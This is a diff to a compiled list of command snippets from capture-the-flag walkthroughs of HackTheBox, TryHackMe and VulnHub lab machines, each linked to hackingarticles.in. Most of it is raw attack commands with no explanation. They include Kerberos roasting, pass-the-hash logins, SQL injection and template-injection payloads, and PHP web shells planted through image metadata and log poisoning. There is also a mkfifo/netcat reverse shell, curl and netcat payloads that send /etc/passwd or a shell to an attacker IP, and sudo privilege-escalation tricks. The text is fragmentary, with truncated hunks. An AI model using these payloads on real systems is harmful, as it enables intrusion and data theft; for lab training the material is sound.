@@ -1,4 +1,8 @@
+Total Challenges: 377
+
+Challenge Name: Blackfield Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/blackfield-hackthebox-walkthrough/
+
 nmap -sV 10.129.45.226
 smbclient -L 10.129.45.226
 impacket-GetNPUsers -dc-ip 10.129.45.226 blackfield.local/ -usersfile username.txt > result.txt
@@ -33,7 +37,10 @@ evil-winrm -i 10.129.45.226 -u administrator -H '184fb5e5178480be64824d4cd53b99e
 
 
 
+
+Challenge Name: Antique Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/antique-hackthebox-walkthrough/
+
 nmap -p- -sV 10.129.33.36
 searchsploit HP JetDirect
 searchsploit -m 22319
@@ -61,8 +68,11 @@ wget 10.10.14.93/chisel_1.7.7_linux_amd64
 ./chisel_1.7.7_linux_amd64 client 10.10.14.93:5000 R:5432:localhost:631
 
 
+T
 
+Challenge Name: Nunchucks Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/nunchucks-hackthebox-walkthrough/
+
 nmap -sV -sC 10.129.30.114
 wfuzz -c -w /usr/share/wordlists/dirb/common.txt -t30 --hw 2271 -H "Host:FUZZ.nunchucks.htb" https://nunchucks.htb/
 {{7*7}}
@@ -85,7 +95,10 @@ chmod  777 test.sh
 
 
 
+
+Challenge Name: Late Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/late-hackthebox-walkthrough/
+
 nmap -sV 10.129.227.134
 {{7*7}}
 {{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
@@ -100,7 +113,10 @@ chmod  777 linpeas.sh
 
 
 
+
+Challenge Name: Backdoor Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/backdoor-hackthebox-walkthrough/
+
 nmap -p- -sV 10.129.96.68
 /wp-content/plugins/
 searchsploit ebook wordpress
@@ -117,7 +133,10 @@ screen -r root/root
 
 
 
+
+Challenge Name: Goodgames Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/goodgames-hackthebox-walkthrough/
+
 nmap -sV -sC 10.129.33.160
 sqlmap -r sqlfile –dbs --batch
 sqlmap -r sqlfile -D main –dbs --batch
@@ -139,7 +158,10 @@ cat /root/root/root.txt
 
 
 
+
+Challenge Name: Paper Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/paper-hackthebox-walkthrough/
+
 nmap  -sV 10.129.74.162
 htttp://10.129.74.162
 curl -I 10.129.74.162
@@ -161,7 +183,10 @@ python3 CVE-2021-3560.py
 
 
 
+
+Challenge Name: Pandora Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/pandora-hackthebox-walkthrough/
+
 nmap -sC -sV 10.129.26.243
 htttp://10.129.26.243
 nmap -sU 10.129.26.243
@@ -203,7 +228,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Driver Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/driver-hackthebox-walkthrough/
+
 cat shell.scf
 [Shell]
 Command=2
@@ -230,7 +258,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Timelapse Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/timelapse-hackthebox-walkthrough/
+
 nmap -p- -sV 10.129.227.105
 smbclient -L 10.129.227.105
 fcrackzip -D -u winrm_backup.zip -p /usr/share/wordlists/rockyou.txt
@@ -245,7 +276,10 @@ evil-winrm -i 10.129.227.105 -u administrator -p 'gU}0649&H)l8VrkJB1n95q0A' -S
 
 
 
+
+Challenge Name: Return Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/return-hackthebox-walkthrough/
+
 nmap -sV -sC 10.129.31.219
 nc -lvp 389
 evil-winrm -i 10.129.31.219 -u svc-printer -p "1edFg43012!!"
@@ -258,7 +292,10 @@ sc.exe start VMTools
 
 
 
+
+Challenge Name: Horizontall Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/horizontall-hackthebox-walkthrough/
+
 nmap -sV -sC -Pn 10.129.149.92
 wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.horizontall.htb" --sc 200 10.129.149.92
 echo "10.129.149.92   api-prod.horizontall.htb" >> /etc/hosts
@@ -287,7 +324,10 @@ chmod +x exploit.py
 
 
 
+
+Challenge Name: Anubis Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/anubis-hackthebox-walkthrough/
+
 nmap -sV -sC -Pn 10.129.95.208
 echo "10.129.95.208   www.windcorp.htb" >> /etc/hosts
 <%
@@ -376,7 +416,10 @@ python3 /home/kali/impacket/examples/psexec.py -hashes 3CCCXXXXXXXXXXXXXXXXXXXXX
 
 
 
+
+Challenge Name: Forge Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/forge-hackthebox-walkthrough/
+
 nmap -sV -sC -p 1-1000 10.129.164.116
 wfuzz -w /home/kali/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.forge.htb" --sc 200 10.129.164.116
 echo "10.129.164.116   admin.forge.htb" >> /etc/hosts
@@ -398,7 +441,10 @@ cat /root/root.txt
 
 
 
+
+Challenge Name: Intelligence Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/intelligence-hackthebox-walkthrough/
+
 nmap -sV -p- 10.129.163.131
 echo "Jose.Williams" > usernames
 echo "William.Lee" >> usernames
@@ -450,7 +496,10 @@ type root.txt
 
 
 
+
+Challenge Name: Writer Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/writer-hackthebox-walkthrough/
+
 nmap -A 10.129.170.230
 gobuster dir -w /home/kali/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 uname=admin' union select 1,2,3,4,5,6 -- &password=admin
@@ -480,7 +529,10 @@ ls -la /bin/bash
 
 
 
+
+Challenge Name: Dailybugle Tryhackme Walkthrough
 Challenge URL: https://www.hackingarticles.in/dailybugle-tryhackme-walkthrough/
+
 nmap -sV -sC 10.10.91.172 -Pn
 joomscan -u http://10.10.91.172
 searchsploit joomla 3.7.0
@@ -510,7 +562,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Previse Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/previse-hackthebox-walkthrough/
+
 nmap -A 10.129.95.185
 gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt --url http://10.129.95.185/ -x php
 python3 -c “import pty;pty.spawn(‘/bin/bash’)”
@@ -528,7 +583,10 @@ sudo /opt/scripts/access_backup.sh
 
 
 
+
+Challenge Name: Hackthebox Toolbox Walkthrough
 Challenge URL: https://www.hackingarticles.in/hackthebox-toolbox-walkthrough/
+
 nmap -A 10.129.224.18
 sqlmap -r req.txt --dbs --force-ssl --batch
 sqlmap -r req.txt --dbs --force-ssl -D public --dump-all --batch
@@ -546,7 +604,10 @@ ssh -i key administrator@10.129.224.18
 
 
 
+
+Challenge Name: Pit Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/pit-hackthebox-walkthrough/
+
 nmap -sV -sC 10.129.95.189
 nmap –sU 10.129.95.189
 nmap -sU -p161 -sV 10.129.95.189
@@ -567,7 +628,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Bounty Hunter Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/bounty-hunter-hackthebox-walkthrough/
+
 nmap -sC -sV 10.129.95.166
 dirb http://10.129.95.166 -X .php
 dbserver = "localhost"
@@ -583,7 +647,10 @@ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
 
 
 
+
+Challenge Name: Seal Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/seal-hackthebox-walkthrough/
+
 nmap -p- -A 10.129.186.142
 dirb https://seal.htb
 tar -xvf backup.gz
@@ -598,7 +665,10 @@ sudo /usr/bin/ansible-playbook ./test.yml
 
 
 
+
+Challenge Name: Explore Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/explore-hackthebox-walkthrough/
+
 nmap -p- -sV 10.129.198.246
 git clone https://github.com/fs0c131y/ESFileExplorerOpenPortVuln
 cd ESFileExplorerOpenPortVuln
@@ -622,7 +692,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Thenotebook Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/thenotebook-hackthebox-walkthrough/
+
 nmap -A  10.129.211.197
 openssl genrsa -out privKey.key 2048
 python -m SimpleHTTPServer 80
@@ -653,7 +726,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Armageddon Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/armageddon-hackthebox-walkthrough/
+
 nmap -A  10.129.48.89
 use exploit/unix/webapp/drupal_drupalgeddon2
 set rhosts 10.129.48.89
@@ -683,7 +759,10 @@ sudo -i
 
 
 
+
+Challenge Name: Cap Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/cap-hackthebox-walkthrough/
+
 nmap -A 10.129.231.234
 http://10.129.231.234/data/0
 Username Nathan
@@ -704,7 +783,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Love Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/love-hackthebox-walkthrough/
+
 nmap –sV 10.129.223.226
 dirb http://love.htbdirb http://love.htb
 http://127.0.0.1:5000
@@ -735,7 +817,10 @@ msiexec /quiet /qn /i priv.msi
 
 
 
+
+Challenge Name: Spectra Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/spectra-hackthebox-walkthrough/
+
 nmap –A  10.129.223.138
 http:10.129.223.138
 cat /etc/hosts
@@ -769,7 +854,10 @@ sudo /sbin/initctl start test
 
 
 
+
+Challenge Name: Knife Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/knife-hackthebox-walkthrough/
+
 nmap –A 10.129.223.91
 http://10.129.223.91
 nikto –h 10.129.223.91
@@ -785,7 +873,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Scriptkiddie Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/scriptkiddie-hackthebox-walkthrough/
+
 nmap –A 10.129.95.150
 use exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection
 set lhost 10.10.14.100
@@ -803,7 +894,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Simple Ctf Tryhackme Walkthrough
 Challenge URL: https://www.hackingarticles.in/simple-ctf-tryhackme-walkthrough/
+
 nmap -sC -sT 10.10.146.189
 dirb http://10.10.146.189
 http://10.10.146.189/simple/
@@ -821,7 +915,10 @@ cat /root/root.txt
 
 
 
+
+Challenge Name: Kenobi Tryhackme Walkthrough
 Challenge URL: https://www.hackingarticles.in/kenobi-tryhackme-walkthrough/
+
 nmap -sV -sC 10.10.101.175
 smbclient -L \\10.10.101.175
 smbclient //10.10.101.175/anonymous
@@ -856,7 +953,10 @@ cat /root/root.txt
 
 
 
+
+Challenge Name: Retro Tryhackme Walkthrough
 Challenge URL: https://www.hackingarticles.in/retro-tryhackme-walkthrough/
+
 nmap -sV -sC 10.10.167.18
 http://10.10.167.18/
 dirb http://10.10.167.18/ /usr/share/dirb/wordlists/big.txt
@@ -867,7 +967,10 @@ xfreerdp /u:wade /p:parzival /v:10.10.167.18
 
 
 
+
+Challenge Name: Mustacchio Tryhackme Walkthrough
 Challenge URL: https://www.hackingarticles.in/mustacchio-tryhackme-walkthrough/
+
 nmap -sC -sV  10.10.74.246
 http://10.10.74.246
 dirb http://10.10.74.246
@@ -923,7 +1026,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Adventure Time Tryhackme Walkthrough
 Challenge URL: https://www.hackingarticles.in/adventure-time-tryhackme-walkthrough/
+
 nmap -sV 10.10.230.20
 https://10.10.230.20
 https://10.10.230.20/candybar
@@ -995,7 +1101,10 @@ ls
 
 
 
+
+Challenge Name: Skynet Tryhackme Walkthrough
 Challenge URL: https://www.hackingarticles.in/skynet-tryhackme-walkthrough/
+
 nmap -sC -sV 10.10.61.86
 http://10.10.61.86
 smbclient -L 10.10.61.86
@@ -1055,7 +1164,10 @@ cat /root/root.txt
 
 
 
+
+Challenge Name: Luanne Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/luanne-hackthebox-walkthrough/
+
 nmap -A 10.129.147.195
 http://10.129.147.195
 gobuster dir --url http://10.129.147.195/ --wordlist /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt
@@ -1095,7 +1207,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Laboratory Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/laboratory-hackthebox-walkthrough/
+
 nmap -A 10.129.148.89
 https://laboratory.htb
 gobuster dir --url https://laboratory.htb/ --wordlist /usr/share/dirbuster/wordlists/directory-list-lowcase-2.3-small.txt -t 50
@@ -1130,7 +1245,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Ready Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/ready-hackthebox-walkthrough/
+
 nmap -A 10.129.149.69
 searchsploit gitlab 11.4.7 
 searchsploit -m 49334 
@@ -1161,7 +1279,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Time Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/time-hackthebox-walkthrough/
+
 nmap -A 10.129.148.206
 https://github.com/jas502n/CVE-2019-12384
 git clone https://github.com/jas502n/CVE-2019-12384.git
@@ -1187,7 +1308,10 @@ cat /root/root.txt
 
 
 
+
+Challenge Name: Pickle Rick Tryhackme Walkthrough
 Challenge URL: https://www.hackingarticles.in/pickle-rick-tryhackme-walkthrough/
+
 nmap -sC -sV 10.10.43.98
 http://10.10.43.98/
 dirb http://10.10.43.98
@@ -1213,7 +1337,10 @@ cat 3rd.txt
 
 
 
+
+Challenge Name: Bookstore Tryhackme Walkthrough
 Challenge URL: https://www.hackingarticles.in/bookstore-tryhackme-walkthrough/
+
 nmap -sV -sC 10.10.136.136
 http://10.10.136.136/
 http://10.10.136.136:5000/
@@ -1243,7 +1370,10 @@ cat /root/root.txt
 
 
 
+
+Challenge Name: Delivery Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/delivery-hackthebox-walkthrough/
+
 nano /etc/hosts
 10.129.149.209  delivery.htb
 nmap -p- -A delivery.htb
@@ -1279,7 +1409,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Watcher Tryhackme Walkthrough
 Challenge URL: https://www.hackingarticles.in/watcher-tryhackme-walkthrough/
+
 nmap -sC -sV 10.10.49.142
 http://10.10.49.142/
 dirb http://10.10.49.142/ -X.php,.txt
@@ -1352,7 +1485,10 @@ cat flag_7.txt
 
 
 
+
+Challenge Name: Blog Tryhackme Walkthrough
 Challenge URL: https://www.hackingarticles.in/blog-tryhackme-walkthrough/
+
 nmap -sV -sC 10.10.109.33
 nano /etc/hosts
 10.10.109.33 blog.thm
@@ -1389,7 +1525,10 @@ cat /media/usb/user.txt
 
 
 
+
+Challenge Name: Boiler Ctf Tryhackme Walkthrough
 Challenge URL: https://www.hackingarticles.in/boiler-ctf-tryhackme-walkthrough/
+
 nmap -sC -sV -Pn -p- 10.10.140.202
 ftp 10.10.140.202
 Anonymous
@@ -1424,7 +1563,10 @@ cat /root/root.txt
 
 
 
+
+Challenge Name: Anonymous Tryhackme Walkthrough
 Challenge URL: https://www.hackingarticles.in/anonymous-tryhackme-walkthrough/
+
 nmap -sC -sV 10.10.3.52
 ftp 10.10.3.52
 ls -la
@@ -1456,7 +1598,10 @@ cat /root/root.txt
 
 
 
+
+Challenge Name: Wonderland Tryhackme Walkthrough
 Challenge URL: https://www.hackingarticles.in/wonderland-tryhackme-walkthrough/
+
 nmap -sC -sV 10.10.123.139
 http://10.10.123.139/
 dirb http://10.10.123.139/
@@ -1506,7 +1651,10 @@ cat /home/alice/root.txt
 
 
 
+
+Challenge Name: Tokyo Ghoul Tryhackme Walkthrough
 Challenge URL: https://www.hackingarticles.in/tokyo-ghoul-tryhackme-walkthrough/
+
 nmap -sC -sV 10.10.43.18
 http://10.10.43.18/
 http://10.10.43.18/jasonroom.html
@@ -1550,7 +1698,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Mnemonic Tryhackme Walkthrough
 Challenge URL: https://www.hackingarticles.in/mnemonic-tryhackme-walkthrough/
+
 nmap -sC -sV -p- 10.10.169.103
 http://10.10.169.103/robots.txt
 http://10.10.169.103/webmasters/
@@ -1604,7 +1755,10 @@ cat /root/root.txt
 
 
 
+
+Challenge Name: Worker Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/worker-hackthebox-walkthrough/
+
 nmap -sC -sV 10.129.2.29
 svn checkout svn://10.129.2.29
 cat moved.txt
@@ -1631,7 +1785,10 @@ type root.txt
 
 
 
+
+Challenge Name: Passage Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/passage-hackthebox-walkthrough/
+
 nmap -sV -sC 10.129.109.173
 nano /etc/hosts
 10.129.109.173  passage.htb
@@ -1683,7 +1840,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Jewel Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/jewel-hackthebox-walkthrough/
+
 nmap -sC 10.129.104.163
 http://10.129.104.163:8000/gitweb/
 bill    bill@mail.htb $2a$12$uhUssB8.HFpT4XpbhclQU.Oizufehl9qqKtmdxTXetojn2FcNncJW
@@ -1709,7 +1869,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Nest Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/nest-hackthebox-walkthrough/
+
 nmap -A 10.129.101.34
 smbclient -L 10.129.101.34
 smbclient \\\\10.129.101.34\\Data
@@ -1790,7 +1953,10 @@ type root.txt
 
 
 
+
+Challenge Name: Resolute Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/resolute-hackthebox-walkthrough/
+
 nmap -sC -sV 10.129.1.152
 enum4linux 10.129.1.152
 hydra -L user.txt -p Welcome123! 10.129.1.152 smb
@@ -1811,7 +1977,10 @@ type root.txt
 
 
 
+
+Challenge Name: Querier Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/querier-hackthebox-walkthrough/
+
 nmap -sC -sV 10.129.1.147
 smbclient -L 10.129.1.147
 smbclient //10.129.1.147/Reports
@@ -1846,7 +2015,10 @@ evil-winrm -i 10.129.1.147 -u Administrator -p 'MyUnclesAreMarioAndLuigi!!1!'
 
 
 
+
+Challenge Name: Openkeys Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/openkeys-hackthebox-walkthrough/
+
 nmap -sC -sV 10.129.39.140
 http://10.129.39.140
 gobuster dir -u http://10.129.39.140 -w /usr/share/wordlists/dirb/common.txt
@@ -1869,7 +2041,10 @@ cat /root/root.txt
 
 
 
+
+Challenge Name: Cache Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/cache-hackthebox-walkthrough/
+
 nmap -sC -sV 10.129.2.219
 cewl -w dict.txt http://10.129.2.219/author.html
 wfuzz -hh 8193 -H 'Host: FUZZ.htb' -u http://10.129.2.219/ --hc 400 -2 dict.txt
@@ -1904,7 +2079,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Book Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/book-hackthebox-walkthrough/
+
 nmap -sV -sC 10.129.1.55
 http://10.129.1.55
 dirb http://10.129.1.55
@@ -1958,7 +2136,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Remote Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/remote-hackthebox-walkthrough/
+
 nmap -A 10.129.77.180
 mkdir /tmp/raj
 showmount -e 10.129.77.180
@@ -1993,7 +2174,10 @@ evil-winrm -u administrator -p !R3m0te! -i 10.129.77.180
 
 
 
+
+Challenge Name: Magic Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/magic-hackthebox-walkthrough/
+
 nmap -sV 10.129.77.148
 http://10.129.77.148
 exiftool -Comment='<?php system($_GET["cmd"]); ?>' 1.png
@@ -2020,7 +2204,10 @@ export PATH=/tmp:$PATH
 
 
 
+
+Challenge Name: Lacasadepapel Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/lacasadepapel-hackthebox-walkthrough/
+
 nmap -sC -sV 10.129.79.144
 file_get_contents('/home/nairobi/ca.key')
 file_get_contents('/etc/passwd')
@@ -2037,7 +2224,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Fuse Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/fuse-hackthebox-walkthrough/
+
 nmap -sC -sV 10.129.2.5
 cewl -w pwd.txt --with-numbers http://fuse.fabricorp.local/papercut/logs/html/index.htm
 hydra -L users.txt -P pwd.txt 10.129.2.5 smb
@@ -2072,14 +2262,20 @@ cat root.txt
 
 
 
+
+Challenge Name: Doctor Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/doctor-hackthebox-walkthrough/
+
 nmap -A -p- 10.10.10.209
 python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.XX.XX --username shaun --password PASSWORD --payload "curl -F 'data=@/etc/passwd' http://10.10.XX.XX:6666
 python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.XX.XX --username shaun --password PASSWORD --payload "nc.traditional -e /bin/sh 10.10.XX.XX 6666"
 
 
 
+
+Challenge Name: Devguru 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/devguru-1-vulnhub-walkthrough/
+
 nmap -p- -A 192.168.1.32
 192.168.1.32:80/.git/
 http://devguru.local:8585/frank/devguru-website.git
@@ -2102,7 +2298,10 @@ sudo -u#-1 sqlite3 /dev/null '.shell /bin/bash'
 
 
 
+
+Challenge Name: Hogwarts Bellatrix Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/hogwarts-bellatrix-vulnhub-walkthrough/
+
 nmap -sC -sV -p- 192.168.1.31
 http://192.168.1.31/ikilledsiriusblack.php?file=/etc/passwd
 ssh '<?php system($_GET['c']); ?>'@192.168.1.31
@@ -2114,13 +2313,19 @@ cat flag.txt
 
 
 
+
+Challenge Name: Cybox 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/cybox-1-vulnhub-walkthrough/
+
 nmap -p- -A cybox.thm
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 
 
 
+
+Challenge Name: Ha Vedas Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/ha-vedas-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.0.163
 nmap -sU 192.168.0.163
@@ -2151,7 +2356,10 @@ cat final.txt
 
 
 
+
+Challenge Name: Ha Sherlock Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/ha-sherlock-vulnhub-walkthrough/
+
 netdiscover
 nmap -sV 192.168.0.170
 http://192.168.0.170
@@ -2182,13 +2390,19 @@ cat 25_Point.txt
 
 
 
+
+Challenge Name: Kb Vuln 3 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/kb-vuln-3-vulnhub-walkthrough/
+
 netdiscover -i ethX
 nmap -A –p- 192.168.10.167
 
 
 
+
+Challenge Name: Ha Forensics Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/ha-forensics-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.0.174
 http://192.168.0.174
@@ -2244,7 +2458,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Maskcrafter 1 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/maskcrafter-1-1-vulnhub-walkthrough/
+
 nmap -A 192.168.1.110
 ftp 192.168.1.110
 Anonymous
@@ -2300,7 +2517,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Tempus Fugit 3 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/tempus-fugit-3-vulnhub-walkthrough/
+
 netdiscover -i ethX
 nmap -A –p- tempusf3.vh
 {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
@@ -2308,13 +2528,19 @@ nmap -A –p- tempusf3.vh
 
 
 
+
+Challenge Name: Insanity 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/insanity-1-vulnhub-walkthrough/
+
 netdiscover -i ethX
 nmap -A –p- insanity.vh
 
 
 
+
+Challenge Name: Panabee 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/panabee-1-vulnhub-walkthrough/
+
 nmap -p- -A 192.168.0.165
 smbclient -L \\192.168.0.165
 smbclient \\\\192.168.0.165\note
@@ -2353,19 +2579,28 @@ cat proof.txt
 
 
 
+
+Challenge Name: Powergrid 1 0 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/powergrid-1-0-1-vulnhub-walkthrough/
+
 netdiscover -i ethX
 nmap -A –p- powergrid.vh
 
 
 
+
+Challenge Name: Relevant 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/relevant-1-vulnhub-walkthrough/
+
 netdiscover -i ethX
 nmap -A –p- 192.168.10.161
 
 
 
+
+Challenge Name: Ha Narak Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/ha-narak-vulnhub-walkthrough/
+
 nmap -A 192.168.0.136
 http://192.168.0.136
 dirb http://192.168.0.136/
@@ -2403,13 +2638,19 @@ cat root.txt
 
 
 
+
+Challenge Name: Durian 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/durian-1-vulnhub-walkthrough/
+
 netdiscover -i ethX
 nmap -p- 192.168.10.184
 
 
 
+
+Challenge Name: Nyx 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/nyx-1-vulnhub-walkthrough/
+
 nmap -sV 192.168.0.113
 http://192.168.0.113
 dirb http://192.168.0.113/ -X .php
@@ -2430,13 +2671,19 @@ cat root.txt
 
 
 
+
+Challenge Name: Cewlkid 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/cewlkid-1-vulnhub-walkthrough/
+
 netdiscover -i ethX
 nmap -A –p- 192.168.10.183
 
 
 
+
+Challenge Name: Mercury Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/mercury-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.0.163
 http://198.168.0.163:8080/
@@ -2463,7 +2710,10 @@ cat root_flag.txt
 
 
 
+
+Challenge Name: Cengbox 2 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/cengbox-2-vulnhub-walkthrough/
+
 nmap -A 192.168.1.104
 ftp 192.168.1.104
 Anonymous
@@ -2516,7 +2766,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Star Wars 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/star-wars-1-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.0.188
 dirb http://192.168.0.188
@@ -2548,7 +2801,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Shelldredd 1 Hannah Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/shelldredd-1-hannah-vulnhub-walkthrough/
+
 netdiscover
 nmap -p- -A 192.168.0.121
 ftp 192.168.0.121
@@ -2576,7 +2832,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Healthcare 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/healthcare-1-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.0.158
 gobuster dir -u http://192.168.0.158/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 100 –e
@@ -2597,19 +2856,28 @@ ls
 
 
 
+
+Challenge Name: Chili 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/chili-1-vulnhub-walkthrough/
+
 netdiscover -i ethX
 nmap -A –p- 192.168.10.182
 
 
 
+
+Challenge Name: Tomato 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/tomato-1-vulnhub-walkthrough/
+
 netdiscover -i ethX
 nmap -A –p- 192.168.10.179
 
 
 
+
+Challenge Name: Loly 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/loly-1-vulnhub-walkthrough/
+
 netdiscover -r 192.168.0.1/24
 nmap -A 192.168.0.180
 dirb http://192.168.0.180
@@ -2627,7 +2895,10 @@ chmod 777 shell
 
 
 
+
+Challenge Name: Cryptobank 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/cryptobank-1-vulnhub-walkthrough/
+
 netdiscover
 nmap -sV 192.168.1.105
 http://192.168.1.105
@@ -2672,7 +2943,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Dmv 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/dmv-1-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.1.105
 --exec%3c'ls${IFS}-la'
@@ -2695,7 +2969,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Photographer 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/photographer-1-vulnhub-walkthrough/
+
 netdiscover -r 10.0.2.0/24
 sudo nmap –sV 10.0.2.20
 smbclient –N –L \\\\10.0.2.20
@@ -2710,7 +2987,10 @@ cd root
 
 
 
+
+Challenge Name: So Simple1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/so-simple1-vulnhub-walkthrough/
+
 <pre>system('cat /etc/passwd')</pre>
 File: payload.txt
 python3 -m http.server 80
@@ -2725,50 +3005,74 @@ bash
 
 
 
+
+Challenge Name: Sunset Midnight Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/sunset-midnight-vulnhub-walkthrough/
+
 netdiscover -i ethX
 nmap -A –p- 192.168.10.178
 
 
 
+
+Challenge Name: Sunset Twilight Vulnhub Walkthrough
